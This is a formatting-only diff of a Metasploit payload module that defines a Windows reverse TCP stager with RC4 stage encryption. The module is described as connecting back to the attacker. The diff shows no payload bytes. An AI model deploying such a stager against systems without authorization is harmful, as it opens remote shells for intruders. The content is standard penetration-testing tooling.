@@ -1,17 +1,15 @@
+# frozen_string_literal: true
 # -*- coding: binary -*-
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 require 'msf/core'
 require 'msf/core/handler/reverse_tcp'
 require 'msf/core/payload/windows/reverse_tcp_rc4'
 
-
 module MetasploitModule
-
   CachedSize = 398
 
   include Msf::Payload::Stager
@@ -23,16 +21,14 @@ module MetasploitModule
 
   def initialize(info = {})
     super(merge_info(info,
-      'Name'          => 'Reverse TCP Stager (RC4 Stage Encryption, Metasm)',
-      'Description'   => 'Connect back to the attacker',
-      'Author'        => ['hdm', 'skape', 'sf', 'mihi', 'RageLtMan'],
-      'License'       => MSF_LICENSE,
-      'Platform'      => 'win',
-      'Arch'          => ARCH_X86,
-      'Handler'       => Msf::Handler::ReverseTcp,
-      'Convention'    => 'sockedi',
-      'Stager'        => { 'RequiresMidstager' => false }
-      ))
+                     'Name'          => 'Reverse TCP Stager (RC4 Stage Encryption, Metasm)',
+                     'Description'   => 'Connect back to the attacker',
+                     'Author'        => ['hdm', 'skape', 'sf', 'mihi', 'RageLtMan'],
+                     'License'       => MSF_LICENSE,
+                     'Platform'      => 'win',
+                     'Arch'          => ARCH_X86,
+                     'Handler'       => Msf::Handler::ReverseTcp,
+                     'Convention'    => 'sockedi',
+                     'Stager'        => { 'RequiresMidstager' => false }))
   end
-
 end
